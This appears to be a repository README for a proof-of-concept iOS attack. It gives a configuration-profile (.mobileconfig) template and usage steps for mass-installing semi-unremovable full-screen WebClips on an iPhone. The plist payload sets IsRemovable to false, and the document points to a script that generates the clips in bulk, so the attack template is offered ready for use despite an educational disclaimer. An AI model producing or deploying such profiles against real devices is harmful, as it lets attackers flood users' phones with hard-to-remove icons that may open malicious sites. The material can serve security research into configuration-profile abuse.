# iOS WebClip Spam PoC

## Overview

This repository demonstrates a proof-of-concept (PoC) for how iOS WebClips could potentially be exploited to place hundreds/thousands of semi-unremovable, potentially harmful web clips on a user's iPhone via a '.mobileconfig' configuration profile.

## ⚠️ Disclaimer

This PoC is for educational and research purposes only. Do not use this for any malicious activities. Always respect applicable laws and regulations.

## Proof of Concept

This PoC demonstrates how a malicious actor could create a configuration profile that installs multiple WebClips at once, potentially overwhelming the user's device.

### Configuration Profile Structure

```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>PayloadContent</key>
    <array>
        <dict>
            <key>FullScreen</key>
            <true/>
            <key>IgnoreManifestScope</key>
            <true/>
            <key>IsRemovable</key>
            <false/>
            <key>Label</key>
            <string>[APP_LABEL]</string>
            <key>Icon</key>
            <data>[BASE64_ENCODED_IMAGE]</data>
            <key>Precomposed</key>
            <true/>
            <key>URL</key>
            <string>[URL]</string>
            <key>PayloadIdentifier</key>
            <string>[ID]</string>
            <key>PayloadType</key>
            <string>com.apple.webClip.managed</string>
            <key>PayloadUUID</key>
            <string>[UUID]</string>
            <key>PayloadVersion</key>
            <integer>1</integer>
        </dict>
    </array>
</dict>
</plist>
```

### Usage

1. Replace the placeholders in square brackets:
   - [APP_LABEL]: Name displayed under the WebClip icon
   - [BASE64_ENCODED_IMAGE]: Base64-encoded icon image data
   - [URL]: Website URL the WebClip opens

2. Use the 'autoCreate.py' Python script, and follow the instructions which are at the top.

## References

- [Apple Configuration Profile Reference](https://developer.apple.com/business/documentation/Configuration-Profile-Reference.pdf)
- [WebClip MDM Payload Settings](https://support.apple.com/guide/mdm/web-clips-mdm54f9b61d/web)
